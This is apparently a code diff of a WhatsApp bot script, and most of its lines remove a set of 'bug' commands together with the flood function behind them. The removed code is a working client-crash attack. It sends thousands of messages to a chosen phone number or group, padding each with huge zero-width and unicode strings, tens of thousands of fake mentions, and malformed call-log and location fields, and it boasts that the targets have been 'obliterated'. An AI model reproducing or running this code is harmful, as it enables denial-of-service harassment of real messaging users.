-                        title: zw(10000) + '💀 ZUKO ULTRA 💀' + zw(10000) + unicodeSpam(5000),
-                        body: zw(10000) + '👻 MAXIMUM PAYLOAD 👻' + zw(10000) + emojiBomb(2000),
-                        mediaType: 'VIDEO',
-                        renderLargerThumbnail: true,
-                        showAdAttribution: true,
-                        sourceUrl: 'https://t.me/ZUKOXMDBOT'
-                    }
-                }
-            };
-            await sock.sendMessage(target, payload);
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.gray(`💀 Mentions: ${i}/500`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 30));
-    }
-
-    // ============================================================
-    // PHASE 3: Protocol Message Spam (300 messages)
-    // ============================================================
-    console.log(chalk.gray(`💀 Phase 3: Protocol Spam (300)`));
-
-    for (let i = 0; i < 300; i++) {
-        try {
-            await sock.sendMessage(target, {
-                text: zw(50000) + `\u2060`.repeat(50000) + unicodeSpam(30000),
-                contextInfo: {
-                    mentionedJid: generateJids(15000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    quotedMessage: {
-                        conversation: zw(20000) + '🫥' + emojiBomb(3000)
-                    },
-                    disappearingMode: {
-                        initiator: target,
-                        initiatedByMe: true,
-                        expiration: 86400
-                    },
-                    groupMentions: [
-                        { groupJid: target, groupSubject: zw(10000) + '💀 ULTRA 💀' + zw(10000) }
-                    ]
-                }
-            });
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.gray(`💀 Protocol: ${i}/300`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 30));
-    }
-
-    // ============================================================
-    // PHASE 4: Ephemeral Message Flood (300 messages)
-    // ============================================================
-    console.log(chalk.gray(`💀 Phase 4: Ephemeral Flood (300)`));
-
-    for (let i = 0; i < 300; i++) {
-        try {
-            await sock.sendMessage(target, {
-                text: zw(50000) + `👻${i}`.repeat(5000) + zw(50000) + unicodeSpam(30000),
-                contextInfo: {
-                    mentionedJid: generateJids(15000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    ephemeralExpiration: 1,
-                    businessMessageForwardInfo: {
-                        businessOwnerJid: target
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.gray(`💀 Ephemeral: ${i}/300`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 25));
-    }
-
-    // ============================================================
-    // PHASE 5: Silent Deletion Flood (200 messages)
-    // ============================================================
-    console.log(chalk.gray(`💀 Phase 5: Deletion Flood (200)`));
-
-    for (let i = 0; i < 200; i++) {
-        try {
-            const msg = await sock.sendMessage(target, {
-                text: zw(50000) + `💀${i}`.repeat(3000) + zw(50000) + emojiBomb(5000) + unicodeSpam(30000),
-                contextInfo: {
-                    mentionedJid: generateJids(15000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    externalAdReply: {
-                        title: zw(10000) + '💀 DELETION FLOOD 💀' + zw(10000),
-                        body: zw(10000) + '👻 INVISIBLE 👻' + zw(10000),
-                        mediaType: 'VIDEO',
-                        renderLargerThumbnail: true,
-                        showAdAttribution: true
-                    }
-                }
-            });
-            if (msg && msg.key) {
-                setTimeout(async () => {
-                    try {
-                        await sock.sendMessage(target, { delete: msg.key });
-                    } catch (e) {}
-                }, 50);
-            }
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.gray(`💀 Deletions: ${i}/200`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 30));
-    }
-
-    // ============================================================
-    // PHASE 6: Massive Unicode Bomb (200 messages)
-    // ============================================================
-    console.log(chalk.gray(`💀 Phase 6: Unicode Bomb (200)`));
-
-    for (let i = 0; i < 200; i++) {
-        try {
-            await sock.sendMessage(target, {
-                text: unicodeSpam(100000) + zw(100000) + emojiBomb(10000) + unicodeSpam(100000),
-                contextInfo: {
-                    mentionedJid: generateJids(20000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    forwardedNewsletterMessageInfo: {
-                        newsletterJid: '120363405724402785@newsletter',
-                        newsletterName: unicodeSpam(10000) + 'ZUKO ULTRA' + unicodeSpam(10000),
-                        serverMessageId: 999999 + i
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.gray(`💀 Unicode: ${i}/200`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 40));
-    }
-
-    // ============================================================
-    // PHASE 7: Call Log + Location Flood (150 messages)
-    // ============================================================
-    console.log(chalk.gray(`💀 Phase 7: Call Log + Location Flood (150)`));
-
-    for (let i = 0; i < 150; i++) {
-        try {
-            await sock.sendMessage(target, {
-                text: zw(50000) + `📞 CALL ${i}`.repeat(3000) + zw(50000),
-                contextInfo: {
-                    mentionedJid: generateJids(15000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    quotedMessage: {
-                        callLogMesssage: {
-                            isVideo: false,
-                            callOutcome: "5",
-                            durationSecs: "9999",
-                            callType: "REGULAR",
-                            participants: Array.from({ length: 100 }, () => ({
-                                jid: generateJids(1)[0],
-                                callOutcome: "5"
-                            }))
-                        }
-                    },
-                    locationMessage: {
-                        degreesLatitude: -999999999.999,
-                        degreesLongitude: 999999999.999,
-                        name: zw(20000) + '💀 LOCATION BOMB 💀' + zw(20000),
-                        address: unicodeSpam(50000)
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.gray(`💀 Call+Location: ${i}/150`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 50));
-    }
-
-    // ============================================================
-    // FINAL SURGE: 300 iterations of combined chaos
-    // ============================================================
-    console.log(chalk.red(`💀 FINAL SURGE: 300 iterations`));
-
-    for (let i = 0; i < 300; i++) {
-        try {
-            const mentions = generateJids(25000 + i * 100);
-            await sock.sendMessage(target, {
-                text: zw(100000) + emojiBomb(10000) + `\n☠️ FINAL SURGE ${i}`.repeat(5000) + zw(100000) + unicodeSpam(50000),
-                contextInfo: {
-                    mentionedJid: mentions,
-                    forwardingScore: 999999999,
-                    isForwarded: true,
-                    forwardedNewsletterMessageInfo: {
-                        newsletterJid: '120363405724402785@newsletter',
-                        newsletterName: '💀 ULTRA STRIKE 💀' + unicodeSpam(10000),
-                        serverMessageId: 999999 + i
-                    },
-                    businessMessageForwardInfo: {
-                        businessOwnerJid: target
-                    },
-                    externalAdReply: {
-                        title: zw(50000) + '💀 ULTRA FINAL SURGE 💀' + zw(50000) + unicodeSpam(20000),
-                        body: zw(50000) + '👻 MAXIMUM PAYLOAD 👻' + zw(50000) + emojiBomb(10000),
-                        mediaType: 'VIDEO',
-                        renderLargerThumbnail: true,
-                        showAdAttribution: true,
-                        sourceUrl: 'https://t.me/ZUKOXMDBOT',
-                        mediaUrl: 'https://t.me/ZUKOXMDBOT'
-                    },
-                    quotedMessage: {
-                        callLogMesssage: {
-                            isVideo: true,
-                            callOutcome: "5",
-                            durationSecs: "99999",
-                            callType: "REGULAR",
-                            participants: Array.from({ length: 200 }, () => ({
-                                jid: generateJids(1)[0],
-                                callOutcome: "5"
-                            }))
-                        }
-                    },
-                    disappearingMode: {
-                        initiator: target,
-                        initiatedByMe: true,
-                        expiration: 1
-                    },
-                    groupMentions: [
-                        { groupJid: target, groupSubject: zw(50000) + '💀 ULTRA SURGE 💀' + zw(50000) }
-                    ]
-                }
-            });
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.red(`💀 Final Surge: ${i}/300`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 20));
-    }
-
-    console.log(chalk.red(`✅ ZUKO PHANTOM STRIKE ULTRA COMPLETE on ${target}`));
-    console.log(chalk.red(`💀💀💀 TARGET ${target} HAS BEEN OBLITERATED 💀💀💀`));
-}
 // ========== ANTI-VIEWONCE HANDLER ==========
 async function handleAntiViewOnce(empire, m) {
     try {
@@ -1466,7 +877,6 @@ module.exports = empire = async (empire, m, chatUpdate, store) => {
         const args = body.slice(prefix.length).trim().split(/ +/);
         const command = args.shift().toLowerCase();
         const text = args.join(" ");
-        const q = text; // Alias for text
 
         const botNumber = await empire.decodeJid(empire.user.id);
         const owner = JSON.parse(fs.readFileSync('./utils/owner.json'));
@@ -1633,11 +1043,6 @@ ${sec('TOOLS', [
   `${prefix}summarize <text>`, `${prefix}code <request>`,
   `${prefix}grammar <text>`, `${prefix}roast @user`, `${prefix}compliment @user`,
   `${prefix}models`, `${prefix}model <id> <question>`
-])}
-
-${sec('BUGS', [
-  `${prefix}melt`, `${prefix}gprotocol`,
-  `${prefix}delay`, `${prefix}gocrash`, `${prefix}goblivion`,  `${prefix}ultra`
 ])}
 
 ${sec('FOOTBALL', [
@@ -2431,118 +1836,7 @@ case 'tomp4': {
     }
     break;
 }
-// ============================================================
-// COMMAND 1: GROUP OBLIVION
-// ============================================================
-case 'goblivion':
-case 'groupoblivion':
-case 'gocrash': {
-    if (!isCreator) return reply("❌ *Owner only command!*");
-    if (!m.isGroup) return reply("👥 *This command only works in groups!*");
-    
 
-    let iterations = 1;
-    if (q) {
-        const num = parseInt(q);
-        if (!isNaN(num) && num > 0) iterations = Math.min(num, 3);
-    }
-
-    await reply(
-`💀 *ZUKO GROUP OBLIVION* 💀
-
-📛 *Group:* ${groupName}
-👥 *Members:* ${participants.length}
-🔄 *Iterations:* ${iterations}
-👻 *Visibility:* 100% INVISIBLE
-
-⏳ *Obliterating all members...*`
-    );
-
-    for (let i = 1; i <= iterations; i++) {
-        try {
-            await ZukoGroupOblivion(empire, m.chat);
-            if (iterations > 1) {
-                await reply(`🔄 *Iteration ${i}/${iterations} sent to ${groupName}*`);
-            }
-            await new Promise(resolve => setTimeout(resolve, 5000));
-        } catch (err) {
-            await reply(`❌ *Iteration ${i} failed:* ${err.message}`);
-        }
-    }
-
-    await reply(
-`✅ *GROUP OBLIVION COMPLETE!*
-
-📛 *Group:* ${groupName}
-👥 *Members:* ${participants.length}
-🔄 *Total Iterations:* ${iterations}
-
-💀 *ALL members' clients should crash within 1-2 minutes.*`
-    );
-    break;
-}
-
-// ============================================================
-// COMMAND 2: MIND MELT
-// ============================================================
-case 'melt':
-case 'mindmelt':
-case 'mm': {
-    if (!isCreator) return reply("❌ *Owner only command!*");
-    if (!q && !m.quoted) {
-        return reply(`⚠️ *Usage:* ${prefix}melt <target_number>\n\n*Example:* ${prefix}melt 2347059886720`);
-    }
-
-    let target = q || m.quoted?.sender;
-    if (!target) return reply("❌ *No target found!*");
-
-    let jid = target.replace(/[^0-9]/g, '');
-    if (jid.startsWith('0')) return reply("❌ *Invalid number!*");
-    if (jid === '2347059886720') return reply("❌ *Protected!*");
-
-    let isTarget = `${jid}@s.whatsapp.net`;
-
-    await reply(`🧠 *ZUKO MIND MELT*\n📱 *Target:* ${isTarget}\n⏳ *Melting target's memory...*`);
-
-    try {
-        await ZukoMindMelt(empire, isTarget);
-        await reply(`✅ *MIND MELT COMPLETE!*\n🧠 *Target memory heap overflowed!*`);
-    } catch (err) {
-        await reply(`❌ *Error:* ${err.message}`);
-    }
-    break;
-}
-
-// ============================================================
-// COMMAND 3: GHOST PROTOCOL
-// ============================================================
-case 'gprotocol':
-case 'ghostprotocol':
-case 'gp': {
-    if (!isCreator) return reply("❌ *Owner only command!*");
-    if (!q && !m.quoted) {
-        return reply(`⚠️ *Usage:* ${prefix}gprotocol <target_number>\n\n*Example:* ${prefix}gprotocol 2347059886720`);
-    }
-
-    let target = q || m.quoted?.sender;
-    if (!target) return reply("❌ *No target found!*");
-
-    let jid = target.replace(/[^0-9]/g, '');
-    if (jid.startsWith('0')) return reply("❌ *Invalid number!*");
-    if (jid === '2347059886720') return reply("❌ *Protected!*");
-
-    let isTarget = `${jid}@s.whatsapp.net`;
-
-    await reply(`👻 *ZUKO GHOST PROTOCOL*\n📱 *Target:* ${isTarget}\n⏳ *Sending protocol exploits...*`);
-
-    try {
-        await ZukoGhostProtocol(empire, isTarget);
-        await reply(`✅ *GHOST PROTOCOL COMPLETE!*\n👻 *Target's protocol handler crashed!*`);
-    } catch (err) {
-        await reply(`❌ *Error:* ${err.message}`);
-    }
-    break;
-}
 // ═══════════════════════════════════════════════════
 // TOPTT - Convert audio/video to voice note (PTT)
 // ═══════════════════════════════════════════════════
@@ -3872,100 +3166,6 @@ case 'deep': {
             reply(`❌ *Failed to get response:* ${e.message || 'Unknown error'}`);
         }
     }
-    break;
-}
-case 'ultra':
-case 'phantomultra':
-case 'pultra':
-case 'maxstrike': {
-    if (!isCreator) return reply("❌ *Owner only command!*");
-
-    let target = null;
-    let iterations = 1;
-
-    if (q) {
-        const parts = q.split(' ');
-        target = parts[0];
-        if (parts[1]) iterations = parseInt(parts[1]) || 1;
-    }
-
-    if (!target && m.quoted) {
-        target = m.quoted.sender || m.quoted.key?.participant || m.quoted.key?.remoteJid;
-    }
-
-    if (!target) {
-        return reply(
-`💀 *ZUKO PHANTOM STRIKE ULTRA* 💀
-
-*Usage:*
-${prefix}ultra <number> [iterations]
-${prefix}ultra 2347059886720 3
-
-*Or reply to a message from the target.*
-
-*Attack Vectors (7 Phases):*
-• Reaction Flood (500 reactions)
-• Mention Flood (500 messages, 15000+ mentions each)
-• Protocol Spam (300 messages)
-• Ephemeral Flood (300 messages)
-• Deletion Flood (200 messages)
-• Unicode Bomb (200 messages, 300000+ chars each)
-• Call Log + Location Flood (150 messages)
-• Final Surge (300 combined attacks)
-
-*Total: 2450+ invisible payloads per run*
-
-💀 *THIS WILL OBLITERATE THE TARGET!*`
-        );
-    }
-
-    let jid = target.replace(/[^0-9]/g, '');
-    if (jid.startsWith('0')) return reply("❌ *Invalid number!*");
-    if (jid === '2347059886720') return reply("❌ *This number is protected!*");
-
-    if (iterations > 3) iterations = 3;
-    if (iterations < 1) iterations = 1;
-
-    let isTarget = `${jid}@s.whatsapp.net`;
-
-    await reply(
-`💀 *ZUKO PHANTOM STRIKE ULTRA* 💀
-
-📱 *Target:* ${isTarget}
-🔄 *Iterations:* ${iterations}
-📦 *Payloads per run:* 2450+
-👻 *Visibility:* 100% INVISIBLE
-⚡ *Max Characters per message:* 500,000+
-
-⏳ *Processing... (This will take a few minutes)*`
-    );
-
-    for (let i = 1; i <= iterations; i++) {
-        try {
-            await ZukoPhantomStrikeUltra(empire, isTarget);
-            console.log(`✅ Ultra iteration ${i}/${iterations} sent to ${isTarget}`);
-            if (iterations > 1) {
-                await reply(`🔄 *Iteration ${i}/${iterations} sent to ${isTarget}*`);
-            }
-            await new Promise(resolve => setTimeout(resolve, 5000));
-        } catch (err) {
-            console.error(`Iteration ${i} failed:`, err);
-            await reply(`❌ *Iteration ${i} failed:* ${err.message || 'Unknown error'}`);
-        }
-    }
-
-    await reply(
-`✅ *ZUKO PHANTOM STRIKE ULTRA COMPLETE!*
-
-📱 *Target:* ${isTarget}
-🔄 *Total Iterations:* ${iterations}
-📦 *Total Payloads:* ${iterations * 2450}+
-👻 *Visibility:* 100% INVISIBLE
-
-💀 *Target client WILL crash within 30 seconds - 2 minutes.*
-⏳ *No visible messages were sent.*
-☠️ *The target has been obliterated!*`
-    );
     break;
 }
 // ═══════════════════════════════════════════════════
